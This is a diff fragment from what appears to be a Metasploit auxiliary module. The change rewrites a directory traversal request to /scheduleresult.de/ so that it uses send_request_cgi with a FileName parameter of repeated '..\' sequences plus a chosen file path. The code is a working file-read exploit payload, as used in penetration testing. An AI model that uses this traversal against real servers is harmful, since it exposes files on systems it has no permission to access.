@@ -49,9 +49,12 @@ class Metasploit3 < Msf::Auxiliary
     traverse = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
     filename = datastore['FILEPATH']
 
-    res = send_request_raw({
-      'uri' => "/scheduleresult.de/?FileName=#{traverse}#{filename}",
-      'method' => 'GET'
+    res = send_request_cgi({
+      'uri'       => '/scheduleresult.de/',
+      'method'    => 'GET',
+      'vars_get'  => {
+        'FileName' => "#{traverse}#{filename}"
+      }
     }, 25)
 
     if res
